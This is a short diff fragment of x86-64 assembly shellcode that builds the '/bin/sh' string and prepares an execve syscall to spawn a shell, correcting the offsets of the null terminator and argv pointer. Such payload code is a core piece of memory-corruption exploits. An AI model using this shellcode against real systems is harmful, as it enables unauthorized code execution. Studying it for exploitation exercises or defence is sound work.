@@ -18,8 +18,8 @@ main:
         xor     %rax, %rcx              /* %rcx=0x00007fffffffdf50 (ptr to str  "/bin/sh") */
 
         xor     %al, %al
-        mov     %al, 8(%rcx)             /* Add '\0' to "/bin/sh" */
-        movq    %rcx, 9(%rcx)           /* Ptr to ['/bin/sh'] */
+        mov     %al, 7(%rcx)             /* Add '\0' to "/bin/sh" */
+        movq    %rcx, 8(%rcx)           /* Ptr to ['/bin/sh'] */
 
         mov     $59, %al                 /* syscall arg 1: syscall number execve(59) */
         movq    %rcx, %rdi               /* syscall arg 2: string pathname */
